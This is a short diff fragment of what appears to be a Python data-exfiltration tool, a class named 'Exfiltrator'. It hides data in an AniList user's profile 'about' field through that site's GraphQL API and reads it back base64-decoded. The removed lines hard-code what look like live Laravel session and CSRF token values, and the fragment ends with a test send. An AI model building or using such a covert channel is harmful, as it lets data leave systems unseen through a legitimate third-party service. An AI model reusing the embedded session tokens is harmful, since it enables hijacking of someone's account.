@@ -23,8 +23,4 @@ class Exfiltrator:
         response = requests.post("https://anilist.co:443/graphql", headers=headers, cookies=cookies, json=json)
         return base64.b64decode(response.json()["data"]["Viewer"]["about"]).decode()
 
-x = Exfiltrator({"laravel_session":"j5tEPVsCFCq0PXzS6dkAh2ov6t8wqQkwXtC6jyOh", "csrf_token":"ZnQv2MFCTuGjQ0ntuIsmAsgOZpgMf7OqRgsAXxIR"})
-x.send(b"snibbles")
-print(x.recv())
-
 
